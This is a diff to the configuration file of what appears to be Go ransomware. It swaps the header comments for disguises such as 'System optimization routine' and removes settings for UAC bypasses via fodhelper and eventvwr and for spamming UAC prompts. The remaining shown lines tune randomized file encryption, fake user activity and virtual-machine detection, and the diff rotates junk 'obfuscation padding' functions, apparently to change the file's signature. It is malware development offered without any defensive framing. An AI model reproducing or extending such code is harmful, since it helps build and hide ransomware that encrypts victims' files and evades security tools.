@@ -1,6 +1,6 @@
 // OBFUSCATED
-// Windows compatibility layer
-// Performance enhancement module
+// Memory management system
+// System optimization routine
 package configuration
 
 import (
@@ -40,15 +40,6 @@ var BatchDelay = 5                // 5 seconds between batches
 var RandomFileOrder = true        // Randomize file encryption order
 var SimulateNormalActivity = true // Add random delays to look like user activity
 var MaxFilesPerDirectory = 50     // Limit files per directory before moving on
-
-// UAC Bypass / Admin Escalation (NEW)
-var EnableUACBypass = true    // Attempt to get admin privileges automatically
-var UACSpamEnabled = true     // Spam UAC prompts until user clicks Yes
-var UACSpamAttempts = 50      // Number of UAC prompts to spam
-var UACSpamDelay = 2          // Seconds between UAC prompts
-var RequireAdmin = false      // If true, exit if admin not obtained (false = continue as user)
-var UseFodhelperBypass = true // Try silent UAC bypass via fodhelper.exe (Win10+)
-var UseEventvwrBypass = true  // Try silent UAC bypass via eventvwr.exe (Win7+)
 
 // Anti-Detection Settings
 var EnableVMDetection = true       // Check for virtual machines
@@ -206,32 +197,38 @@ func GetRandomDelay() time.Duration {
 	return time.Duration(int64(MinRandomDelay)+time.Now().Unix()%int64(MaxRandomDelay-MinRandomDelay)) * time.Second
 }
 
-// Obfuscation padding
-func obf_93368() {
-	_ = 5365
-	var _ = "ad2GhwtCZdY9tqa0TX7ibjhWaovSvq2tOFEpPbr2BlmKGL5YZI"
-}
+
 
 // Obfuscation padding
-func obf_24967() {
-	_ = 4679
-	var _ = "813kwS5dzfFxH2bMeuXrjo79U6gY219qZbiBQqQgmqwlJrnaCF"
+func obf_96237() {
+    _ = 7606
+    var _ = "SV9OdnixJHXefW1W5DpjlOP8LcbrmEDDsaRxkCEOvl3DuYjFsk"
 }
 
-// Obfuscation padding
-func obf_54581() {
-	_ = 1001
-	var _ = "k3mrLZVmoSBtxbp8HOL48jsIs3d8NB6MMw8Yul1ain6S62DZPg"
-}
 
 // Obfuscation padding
-func obf_10299() {
-	_ = 3431
-	var _ = "DvFjj8OiLDp3zjErjAcTTJmHVDHzYfqq8ve8hJQ8qEWRgyvUBx"
+func obf_20354() {
+    _ = 6503
+    var _ = "h00RuLdlUpMjnJNPv939wHWZfphSYY8RuOFmxwYhoCK4vvwgDK"
 }
 
+
 // Obfuscation padding
-func obf_51180() {
-	_ = 5027
-	var _ = "neiKFaeZMjNl2MFJh3pIV0LXochqJh9GwViwDy7EyPn0NBdMlu"
+func obf_54693() {
+    _ = 3697
+    var _ = "dY5sNoucSUdXHtDa3j3Hh6tMcH2jITDZxN3PcypIFf2ZRoIS4a"
+}
+
+
+// Obfuscation padding
+func obf_23100() {
+    _ = 9243
+    var _ = "Jcu3JxPQvCSlonhthLRYPcpj5x6btpy8Ih1WKfL4vFt2nH8Te8"
+}
+
+
+// Obfuscation padding
+func obf_32952() {
+    _ = 3449
+    var _ = "czLqBKM2q4IsQmwvkX6vVrZfOfm3DNIe5VQ50OdBuUJtelqXbr"
 }
